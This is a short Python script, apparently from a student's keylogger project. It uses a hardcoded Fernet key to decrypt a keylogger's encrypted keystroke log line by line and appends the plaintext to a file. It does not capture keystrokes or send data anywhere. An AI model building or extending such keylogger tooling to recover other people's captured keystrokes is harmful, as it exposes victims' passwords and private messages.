from cryptography.fernet import Fernet

# Paste your saved encryption key from when keylogger started
ENCRYPTION_KEY = b'7yh-UvFfwo1Z4HV20zOzVMpnDvciWdkH3yK_1APCceQ='

# Enter your encryption key between ' '

fernet = Fernet(ENCRYPTION_KEY)

# Use forward slashes to avoid Windows escape errors
log_file = "C:/LPU/pro/keylogger adv/logs/14-Aug-2025_01-32-18_IST_keylog.txt"
# Path of the encrypted file

# Where to save decrypted content
output_file = "C:/LPU/pro/keylogger adv/logs/Decrypted.txt"
# Path where to save the output

decrypted_lines = []

try:
    with open(log_file, "r", encoding="utf-8") as f:
        for i, line in enumerate(f, start=1):
            line = line.strip()
            if not line:
                continue
            try:
                decrypted = fernet.decrypt(line.encode()).decode()
                decrypted_lines.append(decrypted)
            except Exception as e:
                print(f"[Line {i}] Error decrypting: {e}")

    # Append mode ensures we don’t overwrite old data
    with open(output_file, "a", encoding="utf-8") as out_f:
        out_f.write("\n".join(decrypted_lines) + "\n")

    print(f"✅ Decrypted data appended to: {output_file}")

except FileNotFoundError:
    print(f"[!] File not found: {log_file}")
